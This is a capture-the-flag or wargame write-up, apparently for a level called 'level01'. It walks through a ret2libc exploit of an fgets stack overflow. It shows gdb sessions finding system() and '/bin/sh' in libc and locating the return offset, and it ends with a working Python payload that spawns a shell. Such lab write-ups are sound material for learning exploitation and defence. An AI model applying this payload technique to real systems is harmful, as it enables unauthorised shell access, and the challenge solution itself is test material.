The program reads a username and checks it against "dat_wil",
and then reads a password.

The password is not really used, but it seems that the buffer used is too small for fgets:
The buffer is 64 bytes but fgets reads 100 bytes (= 0x64 in hex, the problem may come from here)

We can then do a ret to libc attack:

find the adress of system:
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr

system is 0xf7e6aed0

Find the adress of "/bin/sh":
(gdb) info proc map
process 1702
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	...
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	...

(gdb) find 0xf7e2c000, +0x1a0000, "/bin/sh"
0xf7f897ec
1 pattern found.

The adress of "/bin/sh" is 0xf7f897ec

We now need to find what is the offset of the return pointer:

(gdb) r < <(python -c "print 'dat_wil' + '\x00' + '.' * 247 + '.' * 78 + 'aaaabbbbccccddddeeeeffffgggg'")
(The program reads 255 chars for the username, we fill the buffer so that we can enter user and password in one print)

Program received signal SIGSEGV, Segmentation fault.
0x62626161 in ?? ()

The offset is then 80 bytes (0x61 is 'a'), let's try to call "system":

(gdb) b *0x080485b5 (at the end of the main function)
(gdb) r < <(python -c "print 'dat_wil\x00' + 'A' * 247 + 'B' * 80 + '\xd0\xae\xe6\xf7' + '00001111222233334444'")
Breakpoint 1, 0x080485b5 in main ()
(gdb) ni
0xf7e6aed0 in system () from /lib32/libc.so.6

We are in system!
Now let's find where we need to place the adress of "/bin/sh":

(gdb) x/2a $esp
0xffffd71c:	0xf7e6aed0	0x30303030

0x30 = '0', we can place the adress of the string directly after, our exploit is:

(python -c "print 'dat_wil\x00' + 'A' * 247 + 'B' * 80 + '\xd0\xae\xe6\xf7' + '\xec\x97\xf8\xf7' * 5" && cat) | ./level01 

The stack layout seemed to change a bit between multiple calls of system, so we put the adress of "/bin/sh" multiple times and it works

